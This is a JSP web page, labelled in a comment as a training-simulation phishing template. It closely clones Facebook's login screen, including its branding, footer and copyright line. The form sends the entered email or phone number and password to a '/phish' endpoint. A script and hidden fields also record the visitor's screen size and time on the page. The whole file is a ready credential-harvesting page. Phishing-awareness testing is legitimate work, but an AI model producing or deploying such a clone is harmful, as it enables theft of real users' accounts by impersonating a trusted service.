<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%-- PHISHING TEMPLATE: Facebook Login Clone — Training Simulation --%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing:border-box; margin:0; padding:0; }
        body { background:#f0f2f5; font-family:Helvetica,Arial,sans-serif; min-height:100vh; display:flex; flex-direction:column; }

        /* top nav */
        .fb-nav { background:#fff; border-bottom:1px solid #ddd; padding:0 20px; display:flex; align-items:center; height:56px; }
        .fb-logo { font-size:32px; font-weight:700; color:#1877f2; letter-spacing:-1px; }

        /* main layout */
        .fb-main { flex:1; display:flex; align-items:center; justify-content:center; gap:64px; padding:40px 20px; }

        /* left branding */
        .fb-brand h1 { font-size:42px; color:#1877f2; font-weight:700; line-height:1.1; margin-bottom:16px; max-width:420px; }
        .fb-brand p  { font-size:20px; color:#1c1e21; max-width:400px; line-height:1.4; }

        /* login card */
        .fb-card {
            background:#fff; border-radius:8px; padding:16px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
            width: 396px;
        }
        .fb-card input {
            width:100%; padding:14px 16px; border:1px solid #ddd;
            border-radius:6px; font-size:17px; margin-bottom:12px;
            outline:none; transition:border-color .2s;
        }
        .fb-card input:focus { border-color:#1877f2; box-shadow:0 0 0 2px rgba(24,119,242,.2); }
        .fb-card input::placeholder { color:#bbb; }
        .btn-login-fb {
            width:100%; background:#1877f2; color:#fff;
            border:none; border-radius:6px; padding:14px;
            font-size:20px; font-weight:700; cursor:pointer;
            margin-bottom:16px; transition:background .15s;
        }
        .btn-login-fb:hover { background:#166fe5; }
        .fb-forgot { text-align:center; color:#1877f2; font-size:14px; text-decoration:none; display:block; margin-bottom:16px; }
        .fb-forgot:hover { text-decoration:underline; }
        .fb-divider { border:none; border-top:1px solid #ddd; margin:0 0 16px; }
        .btn-new-acc {
            display:block; text-align:center; background:#42b72a;
            color:#fff; border-radius:6px; padding:14px;
            font-size:17px; font-weight:700; text-decoration:none;
            margin:0 auto; width:fit-content; transition:background .15s;
        }
        .btn-new-acc:hover { background:#36a420; color:#fff; }

        /* footer */
        footer { background:#fff; border-top:1px solid #ddd; padding:16px 20px; }
        .footer-links { display:flex; flex-wrap:wrap; gap:6px 14px; font-size:12px; color:#737373; margin-bottom:10px; }
        .footer-links a { color:#737373; text-decoration:none; }
        .footer-links a:hover { text-decoration:underline; }
        .footer-copy { font-size:12px; color:#737373; }
    </style>
</head>
<body>
<div class="fb-nav"><div class="fb-logo">facebook</div></div>

<div class="fb-main">
    <div class="fb-brand">
        <h1>Connect with friends and the world around you.</h1>
        <p>See photos and updates from friends in News Feed.</p>
    </div>

    <div class="fb-card">
        <form method="post" action="${pageContext.request.contextPath}/phish">
            <input type="hidden" name="screenSize" id="screenSize" value="">
            <input type="hidden" name="timeOnPage" id="timeOnPage" value="0">

            <input type="text"     name="username" placeholder="Email address or phone number" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn-login-fb">Log In</button>
            <a href="#" class="fb-forgot">Forgotten password?</a>
            <hr class="fb-divider">
            <a href="#" class="btn-new-acc">Create new account</a>
        </form>
    </div>
</div>

<footer>
    <div class="footer-links">
        <a href="#">English (UK)</a><a href="#">Bahasa Indonesia</a><a href="#">Polski</a>
        <a href="#">Español</a><a href="#">Português</a><a href="#">Français</a>
    </div>
    <div class="footer-links">
        <a href="#">Sign Up</a><a href="#">Log in</a><a href="#">Messenger</a>
        <a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Privacy</a>
        <a href="#">Terms</a><a href="#">Help Centre</a>
    </div>
    <div class="footer-copy">Meta © 2024</div>
</footer>

<script>
    const startTime = Date.now();
    document.getElementById('screenSize').value = window.screen.width + 'x' + window.screen.height;
    document.querySelector('form').addEventListener('submit', function() {
        document.getElementById('timeOnPage').value = Math.floor((Date.now() - startTime) / 1000);
    });
</script>
</body>
</html>
